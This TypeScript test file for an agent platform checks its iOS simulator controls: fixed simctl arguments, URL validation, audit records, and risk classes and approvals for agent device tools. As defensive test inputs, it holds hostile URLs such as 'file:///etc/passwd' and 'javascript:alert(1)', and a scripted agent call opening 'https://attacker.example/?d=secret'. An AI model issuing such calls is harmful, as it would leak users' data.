// This Mac's iOS simulators: the simctl module with a stand-in runner, the 设备 panel's routes in a real Host, and the
// `device_*` tools of the built-in harness. Nothing here runs the real simctl.
import { randomUUID } from 'node:crypto'
import { readFile } from 'node:fs/promises'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import type { TaskDetail } from '@latch/protocol'
import type { HarnessPlugin, ModelMessage, ToolDefinition } from '@latch/sdk'
import type { TestDevice } from '@latch/testkit'
import { classifyStandardCall } from '../src/risk.ts'
import { DEVICE_TOOL_DEFINITIONS } from '../src/plugins/tools/device/index.ts'
import { Simulators, runFixed, simulatorUrl, type SimctlRunner } from '../src/simulators.ts'
import { startTestHost, type TestHost } from './helpers/host.ts'

const cleanups: Array<() => Promise<void> | void> = []
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup()
})

const OURS = '11111111-1111-4111-8111-111111111111'
const THEIRS = '22222222-2222-4222-8222-222222222222'
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3])
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64')

/** simctl as far as Latch uses it: two devices, the second already running as the person left it. */
function fakeSimctl(options: { xcode?: boolean; pictureBytes?: number; hold?: Promise<void> } = {}) {
  const states = new Map([
    [OURS, 'Shutdown'],
    [THEIRS, 'Booted'],
  ])
  const calls: string[][] = []
  const aborted: string[][] = []
  /** `lastUsedAt` as Xcode 27.2 lists it: unset before a first boot, new on each boot. */
  const marks = new Map<string, string>([[THEIRS, '2026-11-17T01:00:00Z']])
  let boots = 0
  const run: SimctlRunner = async (args, { signal }) => {
    calls.push([...args])
    if (options.xcode === false) return { code: 72, stdout: Buffer.alloc(0), stderr: 'xcrun: error: unable to find utility "simctl"' }
    if (options.hold && args[0] !== 'list') {
      await Promise.race([options.hold, new Promise(resolve => signal?.addEventListener('abort', resolve, { once: true }))])
      if (signal?.aborted) {
        aborted.push([...args])
        return { code: -1, stdout: Buffer.alloc(0), stderr: '' }
      }
    }
    const [command, udid] = args
    if (command === 'list') {
      const devices = [...states].map(([id, state], index) => ({
        udid: id,
        name: index === 0 ? 'latch-test' : 'iPhone 18 Pro',
        state,
        isAvailable: true,
        ...(marks.has(id) ? { lastUsedAt: marks.get(id) } : {}),
      }))
      return {
        code: 0,
        stdout: Buffer.from(JSON.stringify({ devices: { 'com.apple.CoreSimulator.SimRuntime.iOS-27-2': devices } })),
        stderr: '',
      }
    }
    if (command === 'boot') {
      states.set(udid!, 'Booted')
      marks.set(udid!, `2026-11-17T02:00:${String(++boots).padStart(2, '0')}Z`)
    } else if (command === 'shutdown') states.set(udid!, 'Shutdown')
    else if (command === 'io') {
      const { writeFile } = await import('node:fs/promises')
      const file = args.at(-1)!
      await writeFile(file, options.pictureBytes ? Buffer.alloc(options.pictureBytes, 1) : file.endsWith('.png') ? PNG : JPEG)
    } else if (command === 'ui' && args.length === 3) return { code: 0, stdout: Buffer.from('light\n'), stderr: '' }
    else if (command === 'openurl' && String(args[2]).startsWith('nowhere:'))
      return { code: 115, stdout: Buffer.alloc(0), stderr: 'Simulator device failed to open nowhere://x.\n' }
    return { code: 0, stdout: Buffer.alloc(0), stderr: '' }
  }
  return { run, calls, aborted, states, marks }
}

describe('simctl module', () => {
  it('runs fixed argument lists with real UDIDs only, never `booted` or an option', async () => {
    const sim = fakeSimctl()
    const simulators = new Simulators({ run: sim.run })
    for (const bad of ['booted', 'all', '--help', 'abcdef00-1111-4111-8111-111111111111', `${OURS} x`, ''])
      await expect(simulators.boot(bad)).rejects.toMatchObject({ code: 'invalid-input' })
    await expect(simulators.boot('33333333-3333-4333-8333-333333333333')).rejects.toMatchObject({ code: 'simulator-not-found' })
    await simulators.boot(OURS)
    await simulators.openUrl(OURS, 'https://example.com/a?b=c')
    await simulators.setAppearance(OURS, 'dark')
    await expect(simulators.setAppearance(OURS, 'sepia')).rejects.toMatchObject({ code: 'invalid-input' })
    expect(sim.calls.filter(args => args[0] !== 'list')).toEqual([
      ['boot', OURS],
      ['bootstatus', OURS],
      ['openurl', OURS, 'https://example.com/a?b=c'],
      ['ui', OURS, 'appearance', 'dark'],
    ])
    expect(
      sim.calls.some(args => args.includes('booted') || args.some(arg => /^(erase|delete|install|keychain|privacy|push)$/u.test(arg))),
    ).toBe(false)
  })

  it('refuses addresses that read files or run script, and blanks or controls', () => {
    expect(simulatorUrl('https://example.com')).toBe('https://example.com')
    expect(simulatorUrl('myapp://open/item')).toBe('myapp://open/item')
    expect(simulatorUrl('http://localhost:5173/')).toBe('http://localhost:5173/')
    for (const bad of [
      'file:///etc/passwd',
      'javascript:alert(1)',
      'data:text/html,x',
      'about:blank',
      'https://a b',
      'https://x\n',
      'nope',
      'x'.repeat(3000),
      42,
    ])
      expect(() => simulatorUrl(bad)).toThrow()
  })

  it('shuts down only a device it booted, and forgets one shut down elsewhere', async () => {
    const sim = fakeSimctl()
    const simulators = new Simulators({ run: sim.run })
    // Already running: left as it is and still the person's.
    expect((await simulators.boot(THEIRS)).ours).toBe(false)
    await expect(simulators.shutdown(THEIRS)).rejects.toMatchObject({ code: 'simulator-not-ours' })
    expect(sim.calls.some(args => args[0] === 'boot' || args[0] === 'shutdown')).toBe(false)
    expect((await simulators.boot(OURS)).ours).toBe(true)
    expect((await simulators.list()).devices.find(device => device.udid === OURS)?.ours).toBe(true)
    // The person shuts it down in Simulator, then boots it again: it is theirs now.
    sim.states.set(OURS, 'Shutdown')
    await simulators.list()
    sim.states.set(OURS, 'Booted')
    expect((await simulators.list()).devices.find(device => device.udid === OURS)?.ours).toBe(false)
    await expect(simulators.shutdown(OURS)).rejects.toMatchObject({ code: 'simulator-not-ours' })
    // Shut down and booted again between two lists: simctl's boot time is new, so it is the person's now too.
    sim.states.set(OURS, 'Shutdown')
    await simulators.boot(OURS)
    expect((await simulators.list()).devices.find(device => device.udid === OURS)?.ours).toBe(true)
    sim.marks.set(OURS, '2026-11-17T03:00:00Z')
    expect((await simulators.list()).devices.find(device => device.udid === OURS)?.ours).toBe(false)
    await expect(simulators.shutdown(OURS)).rejects.toMatchObject({ code: 'simulator-not-ours' })
  })

  it('takes pictures only of running devices, within 5 MiB, and keeps no file', async () => {
    const sim = fakeSimctl()
    const simulators = new Simulators({ run: sim.run })
    await expect(simulators.picture(OURS, 'png')).rejects.toMatchObject({ code: 'simulator-not-booted' })
    const [frame, again] = await Promise.all([
      simulators.picture(THEIRS, 'jpeg', { frame: true }),
      simulators.picture(THEIRS, 'jpeg', { frame: true }),
    ])
    expect(frame.equals(JPEG) && again.equals(JPEG)).toBe(true)
    // Two asks at once share one simctl run.
    expect(sim.calls.filter(args => args[0] === 'io')).toHaveLength(1)
    expect(simulators.shown()).toBe(THEIRS)
    const io = sim.calls.find(args => args[0] === 'io')!
    expect(io.slice(0, 4)).toEqual(['io', THEIRS, 'screenshot', '--type=jpeg'])
    await expect(readFile(io.at(-1)!)).rejects.toMatchObject({ code: 'ENOENT' })
    const big = new Simulators({ run: fakeSimctl({ pictureBytes: 5 * 1024 * 1024 + 1 }).run })
    await expect(big.picture(THEIRS, 'png')).rejects.toMatchObject({ code: 'simulator-picture-too-large' })
  })

  it('says when Xcode is missing, and ends its children on stop without touching a device it did not boot', async () => {
    const none = new Simulators({ run: fakeSimctl({ xcode: false }).run })
    expect(await none.list()).toEqual({ xcode: false, devices: [] })
    expect(none.offered).toBe(true)
    expect(new Simulators().supported).toBe(false)
    expect(await new Simulators().list()).toEqual({ xcode: false, devices: [] })
    let release!: () => void
    const sim = fakeSimctl({ hold: new Promise(resolve => (release = resolve)) })
    const simulators = new Simulators({ run: sim.run })
    sim.states.set(OURS, 'Booted')
    const booting = simulators.openUrl(OURS, 'https://example.com').catch(error => error)
    await new Promise(resolve => setTimeout(resolve, 10))
    simulators.stop()
    expect(await booting).toMatchObject({ code: 'simulator-failed' })
    release()
    expect(sim.aborted.map(args => args[0])).toContain('openurl')
    expect(sim.calls.some(args => args[0] === 'shutdown')).toBe(false)
    await expect(simulators.list()).rejects.toMatchObject({ code: 'simulator-unavailable' })
  })
})

describe('an agent using a device through Xcode', () => {
  it('holds it from a session start to its end, or until its turn, session or bridge ends', () => {
    const simulators = new Simulators({ run: fakeSimctl().run })
    simulators.agentCall('s1', 'call', OURS)
    expect(simulators.agentsUsing()).toEqual([])
    simulators.agentCall('s1', 'start')
    expect(simulators.agentsUsing()).toEqual([{ sessionId: 's1' }])
    simulators.agentCall('s1', 'call', OURS)
    simulators.agentCall('s2', 'start', THEIRS)
    expect(simulators.agentsUsing()).toEqual([
      { sessionId: 's1', udid: OURS },
      { sessionId: 's2', udid: THEIRS },
    ])
    simulators.agentCall('s1', 'end')
    simulators.agentEnded('s2')
    expect(simulators.agentsUsing()).toEqual([])
  })
})

describe('programs the Host runs for simulators', () => {
  it('run in / and never in the Host’s own folder', async () => {
    const result = await runFixed('/bin/pwd', [], { timeoutMs: 5_000 })
    expect(result.stdout.toString('utf8').trim()).toBe('/')
    expect(process.cwd()).not.toBe('/')
  })
})

describe('device tool classes', () => {
  it('looking is R0, acting R1, and only for the Host’s own plugin', () => {
    const risk = (toolName: string, pluginId = 'device') =>
      classifyStandardCall({ pluginId, toolName, args: {}, demo: false, folders: [] }).risk
    expect(DEVICE_TOOL_DEFINITIONS.map(tool => [tool.name, risk(tool.name)])).toEqual([
      ['device_list', 'R0'],
      ['device_screenshot', 'R0'],
      ['device_open_url', 'R1'],
      ['device_set_appearance', 'R1'],
      ['device_rotate', 'R1'],
      ['device_apps', 'R0'],
      ['device_launch', 'R1'],
    ])
    expect(risk('device_list', 'someone-else')).toBe('R2')
    expect(risk('device_boot')).toBe('R2')
  })
})

async function hostWithSimulators(
  options: Parameters<typeof startTestHost>[0] = {},
  sim = fakeSimctl(),
): Promise<{ t: TestHost; sim: ReturnType<typeof fakeSimctl> }> {
  const t = await startTestHost({ tls: true, simulators: { run: sim.run }, ...options })
  cleanups.push(() => t.close())
  return { t, sim }
}

async function audit(t: TestHost): Promise<Array<{ action: string; actor: { listener: string }; detail: Record<string, unknown> }>> {
  return (await readFile(join(t.dataDir, 'audit', 'audit.jsonl'), 'utf8'))
    .trim()
    .split('\n')
    .map(line => JSON.parse(line))
}

const offered = async (device: TestDevice) =>
  (await device.json<{ catalog: { features: { simulators?: boolean } } }>('snapshot')).catalog.features.simulators

describe('设备 panel routes', () => {
  it('are this Mac’s alone, for a device allowed what the terminal is allowed', async () => {
    const { t } = await hostWithSimulators()
    const desktop = await t.enroll({ listener: 'unix', name: 'Desktop' })
    const browser = await t.enroll({ name: 'Browser', scopes: ['view', 'run', 'admin'] })
    const phone = await t.enroll({ listener: 'tls', name: 'Phone', scopes: ['view', 'run', 'admin'] })
    const viewer = await t.enroll({ listener: 'unix', name: 'Viewer', scopes: ['view'] })
    const work = await t.enroll({ listener: 'unix', name: 'Work window' })
    expect((await desktop.request(`devices/${work.id}`, { method: 'PATCH', body: { dataScope: 'work' } })).status).toBe(200)
    expect(await offered(desktop)).toBe(true)
    for (const elsewhere of [browser, phone, viewer, work]) {
      expect(await offered(elsewhere)).toBeUndefined()
      expect((await elsewhere.request('simulators')).status).toBe(403)
      expect((await elsewhere.request(`simulators/${THEIRS}/frame`)).status).toBe(403)
      expect((await elsewhere.request(`simulators/${OURS}/boot`, { method: 'POST' })).status).toBe(403)
    }
    const list = await desktop.json<{ xcode: boolean; devices: Array<{ udid: string; state: string }> }>('simulators')
    expect(list.xcode).toBe(true)
    expect(list.devices.map(device => [device.udid, device.state])).toEqual([
      [OURS, 'shutdown'],
      [THEIRS, 'booted'],
    ])
  })

  it('is absent where the Host runs no simctl', async () => {
    const t = await startTestHost({})
    cleanups.push(() => t.close())
    const desktop = await t.enroll({ listener: 'unix' })
    expect(await offered(desktop)).toBeUndefined()
    expect((await desktop.request('simulators')).status).toBe(501)
  })

  it('records each action before it runs, never a picture or an address, and shuts down only its own', async () => {
    const { t, sim } = await hostWithSimulators()
    const desktop = await t.enroll({ listener: 'unix', name: 'Desktop' })
    const frame = await desktop.request(`simulators/${THEIRS}/frame`)
    expect(frame.status).toBe(200)
    expect(frame.headers.get('content-type')).toBe('image/jpeg')
    expect(frame.headers.get('cache-control')).toBe('no-store')
    expect(Buffer.from(await frame.arrayBuffer()).equals(JPEG)).toBe(true)
    const shot = await desktop.request(`simulators/${THEIRS}/screenshot`, { method: 'POST' })
    expect(shot.headers.get('content-type')).toBe('image/png')
    const refused = await desktop.request(`simulators/${THEIRS}/shutdown`, { method: 'POST' })
    expect([refused.status, ((await refused.json()) as { error: string }).error]).toEqual([409, 'simulator-not-ours'])
    expect((await desktop.request(`simulators/${OURS}/frame`)).status).toBe(409)
    expect((await desktop.request(`simulators/${OURS}/boot`, { method: 'POST' })).status).toBe(200)
    expect((await desktop.request(`simulators/${OURS}/open-url`, { body: { url: 'https://example.com/secret?q=1' } })).status).toBe(200)
    expect((await desktop.request(`simulators/${OURS}/open-url`, { body: { url: 'file:///etc/hosts' } })).status).toBe(400)
    expect((await desktop.request(`simulators/${OURS}/appearance`, { body: { appearance: 'dark' } })).status).toBe(200)
    expect((await desktop.request(`simulators/${OURS}/shutdown`, { method: 'POST' })).status).toBe(200)
    expect(sim.states.get(THEIRS)).toBe('Booted')
    const records = (await audit(t)).filter(record => record.action === 'simulator.action')
    expect(records.map(record => record.detail.action)).toEqual(['screenshot', 'boot', 'open-url', 'appearance', 'shutdown'])
    expect(records.every(record => record.actor.listener === 'unix')).toBe(true)
    const text = JSON.stringify(records)
    expect(text).not.toContain('example.com')
    expect(text).not.toContain('secret')
    expect(records[2]!.detail).toMatchObject({ udid: OURS, scheme: 'https', originHash: expect.stringMatching(/^[0-9a-f]{64}$/u) })
  })

  it('opens a device in Device Hub with a fixed opener, on record first', async () => {
    const opened: string[] = []
    const sim = fakeSimctl()
    const t = await startTestHost({
      simulators: {
        run: sim.run,
        openHub: async udid => {
          opened.push(udid)
          return { code: 0, stdout: Buffer.alloc(0), stderr: '' }
        },
      },
    })
    cleanups.push(() => t.close())
    const desktop = await t.enroll({ listener: 'unix' })
    expect((await desktop.request(`simulators/${OURS}/device-hub`, { method: 'POST' })).status).toBe(200)
    expect((await desktop.request('simulators/booted/device-hub', { method: 'POST' })).status).toBe(400)
    expect(opened).toEqual([OURS])
    expect((await audit(t)).filter(record => record.action === 'simulator.action').map(record => record.detail)).toEqual([
      { action: 'device-hub', udid: OURS },
    ])
  })

  it('says when Xcode is missing', async () => {
    const { t } = await hostWithSimulators({}, fakeSimctl({ xcode: false }))
    const desktop = await t.enroll({ listener: 'unix' })
    expect(await desktop.json('simulators')).toEqual({
      xcode: false,
      devices: [],
      abilities: { rotate: false, record: false, logs: false },
    })
    expect(await offered(desktop)).toBe(true)
  })
})

/** A model that calls the tools in `steps` one per step and remembers what each request offered. */
function scripted(steps: Array<{ name: string; arguments: Record<string, unknown> }>) {
  const seen: Array<{ tools: string[]; messages: ModelMessage[] }> = []
  const plugin: HarnessPlugin = {
    id: 'scripted',
    name: 'Scripted',
    version: '1',
    description: 'fixture',
    activate(context) {
      context.registerProvider({
        id: 'scripted',
        name: 'Scripted',
        model: 'scripted',
        modelCapabilities: { scripted: { vision: true } },
        async *stream({ messages, tools }: { messages: ModelMessage[]; tools: ToolDefinition[] }) {
          seen.push({ tools: tools.map(tool => tool.name), messages })
          const step = steps[messages.filter(message => message.role === 'tool').length]
          if (!step) {
            yield { type: 'text', text: 'done' }
            yield { type: 'finish', reason: 'stop' }
            return
          }
          yield { type: 'tool-call', call: { id: `call-${randomUUID()}`, ...step } }
          yield { type: 'finish', reason: 'tool-calls' }
        },
      })
    },
  }
  return { plugin, seen }
}

async function settled(device: TestDevice, sessionId: string): Promise<TaskDetail> {
  for (let attempt = 0; attempt < 200; attempt++) {
    const detail = await device.json<TaskDetail>(`tasks/${sessionId}`)
    if (!['running', 'waiting-approval'].includes(detail.summary.status)) return detail
    await new Promise(resolve => setTimeout(resolve, 25))
  }
  throw new Error('session did not settle')
}

describe('device tools of the built-in harness', () => {
  it('need this Mac’s desktop app open, and tell the agent to ask the person to start a device', async () => {
    const { plugin, seen } = scripted([
      { name: 'device_list', arguments: {} },
      { name: 'device_screenshot', arguments: { udid: OURS } },
    ])
    const { t } = await hostWithSimulators({ demo: false, providerId: 'scripted', plugins: [plugin] })
    const desktop = await t.enroll({ listener: 'unix' })
    const start = () =>
      desktop.json<{ sessionId: string }>('tasks', {
        method: 'POST',
        body: { requestId: randomUUID(), prompt: '看一眼', mode: 'agent', model: { providerId: 'scripted', model: 'scripted' } },
      })
    const closed = await settled(desktop, (await start()).sessionId)
    expect(seen[0]!.tools).toEqual(expect.arrayContaining(['device_list', 'device_screenshot', 'device_open_url', 'device_set_appearance']))
    expect(closed.messages.find(message => message.toolName === 'device_list')?.text).toContain('Latch 窗口没有打开')
    // With the desktop app as the browser provider.
    const registered = await desktop.registerBrowserProvider()
    expect(registered.status).toBe(201)
    const { providerId } = (await registered.json()) as { providerId: string }
    const stop = new AbortController()
    cleanups.push(() => stop.abort())
    expect((await desktop.request('browser-provider/stream', { method: 'POST', body: { providerId }, signal: stop.signal })).status).toBe(
      200,
    )
    const done = await settled(desktop, (await start()).sessionId)
    const list = done.messages.find(message => message.toolName === 'device_list')!
    expect(list.state).toBe('completed')
    const shot = done.messages.find(message => message.toolName === 'device_screenshot')!
    expect(shot.state).toBe('failed')
    expect(shot.text).toContain('设备未启动，请在设备面板里启动')
    const calls = (await audit(t)).filter(record => record.action === 'simulator.call')
    expect(calls.map(record => [record.detail.tool, record.detail.risk, record.detail.udid])).toEqual([
      ['device_list', 'R0', undefined],
      ['device_screenshot', 'R0', OURS],
    ])
  })
})

/** The desktop app as the browser provider: the device tools run only while it is. */
async function provide(desktop: TestDevice) {
  const registered = await desktop.registerBrowserProvider()
  const { providerId } = (await registered.json()) as { providerId: string }
  const stop = new AbortController()
  cleanups.push(() => stop.abort())
  expect((await desktop.request('browser-provider/stream', { method: 'POST', body: { providerId }, signal: stop.signal })).status).toBe(200)
}

describe('what an agent may open on a device', () => {
  it('only this Mac’s own addresses, even after 本会话始终允许; never a deep link; the person may open both', async () => {
    const { plugin } = scripted([
      { name: 'device_open_url', arguments: { udid: THEIRS, url: 'http://localhost:3000/' } },
      { name: 'device_open_url', arguments: { udid: THEIRS, url: 'https://attacker.example/?d=secret' } },
      { name: 'device_open_url', arguments: { udid: THEIRS, url: 'myapp://open/item' } },
      { name: 'device_open_url', arguments: { udid: THEIRS, url: 'http://127.0.0.1:5173/' } },
    ])
    const { t, sim } = await hostWithSimulators({ demo: false, providerId: 'scripted', plugins: [plugin] })
    const desktop = await t.enroll({ listener: 'unix' })
    await provide(desktop)
    const { sessionId } = await desktop.json<{ sessionId: string }>('tasks', {
      method: 'POST',
      body: { requestId: randomUUID(), prompt: '打开', mode: 'agent', model: { providerId: 'scripted', model: 'scripted' } },
    })
    const asked: string[] = []
    let detail: TaskDetail | undefined
    for (let attempt = 0; attempt < 400; attempt++) {
      detail = await desktop.json<TaskDetail>(`tasks/${sessionId}`)
      for (const approval of detail.approvals ?? []) {
        asked.push(approval.toolName)
        await desktop.request(`approvals/${approval.id}`, { body: { decision: 'allow', optionId: 'allow_always' } })
      }
      if (!['running', 'waiting-approval'].includes(detail.summary.status)) break
      await new Promise(resolve => setTimeout(resolve, 25))
    }
    // Asked once; the allowance then stands for the session, and still nothing but this Mac's addresses opens.
    expect(asked).toEqual(['device_open_url'])
    const rows = detail!.messages.filter(message => message.toolName === 'device_open_url')
    expect(rows.map(row => row.state)).toEqual(['completed', 'failed', 'failed', 'completed'])
    expect(rows[1]!.text).toContain('请人在设备面板里打开')
    expect(rows[1]!.text).toContain('本机地址')
    expect(rows[2]!.text).toContain('深链接')
    expect(sim.calls.filter(args => args[0] === 'openurl').map(args => args[2])).toEqual([
      'http://localhost:3000/',
      'http://127.0.0.1:5173/',
    ])
    // The person, from the panel, opens a deep link and any web address.
    for (const url of ['myapp://open/item', 'https://example.com/'])
      expect((await desktop.request(`simulators/${THEIRS}/open-url`, { body: { url } })).status).toBe(200)
  })

  it('runs only for a turn sent from a device that sees all data', async () => {
    const { plugin } = scripted([{ name: 'device_list', arguments: {} }])
    const { t } = await hostWithSimulators({ demo: false, providerId: 'scripted', plugins: [plugin] })
    const desktop = await t.enroll({ listener: 'unix' })
    const phone = await t.enroll({ listener: 'tls', scopes: ['view', 'run'], dataScope: 'files' })
    await provide(desktop)
    const { sessionId } = await phone.json<{ sessionId: string }>('tasks', {
      method: 'POST',
      body: { requestId: randomUUID(), prompt: '看一眼', mode: 'agent', model: { providerId: 'scripted', model: 'scripted' } },
    })
    const done = await settled(desktop, sessionId)
    const row = done.messages.find(message => message.toolName === 'device_list')!
    expect(row.state).toBe('failed')
    expect(row.text).toContain('设备工具不可用')
    expect((await audit(t)).some(record => record.action === 'simulator.call')).toBe(false)
  })
})
